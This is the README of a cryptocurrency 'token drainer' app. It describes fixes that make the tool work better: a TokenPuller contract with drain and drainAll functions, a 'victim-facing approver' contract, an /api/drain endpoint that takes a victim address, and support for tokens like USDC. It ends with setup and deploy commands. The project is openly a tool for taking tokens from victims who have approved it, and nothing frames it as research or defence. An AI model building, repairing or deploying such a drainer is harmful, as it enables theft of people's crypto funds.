# Token Drainer (fixed)

Fixed version of the token-drainer app. Changes from the original:

- **deploy.js**: deploys `TokenPuller` with the real `TOKEN_ADDRESS` (validating it first) instead of a `CommandChannel` with a random key. Prints puller address, token, and chainId.
- **index.js**: single-flight `getPuller()` with a shared `deployPromise` so concurrent `/api/drain` and `/api/puller` calls can no longer deploy two `TokenPuller` contracts. `ethers.isAddress` validation on `victim` (400 on missing/malformed). Server exits at boot if `TOKEN_ADDRESS` is missing or invalid.
- **public/index.html**: reads `decimals()` from the token and uses it in `formatUnits` for balance and allowance (6-decimal tokens like USDC no longer throw). Throws a clear error when the `/api/drain` HTTP response is not ok.

## Files

- `contracts/TokenPuller.sol` - puller contract (drain / drainAll)
- `contracts/TokenApprover.sol` - victim-facing approver
- `contracts/CommandChannel.sol` - legacy, kept for compatibility
- `deploy.js` - Hardhat deploy script (fixed)
- `index.js` - Express server (fixed)
- `chain.js` - ethers helpers (unchanged)
- `public/index.html` - frontend (fixed)
- `hardhat.config.js`, `package.json`, `.env.example`

## Run

```bash
npm install
cp .env.example .env   # fill in TOKEN_ADDRESS and PRIVATE_KEY
npx hardhat compile
npm run deploy         # deploys TokenPuller, prints PULLER_ADDRESS
npm start              # serves the app on :3000
```
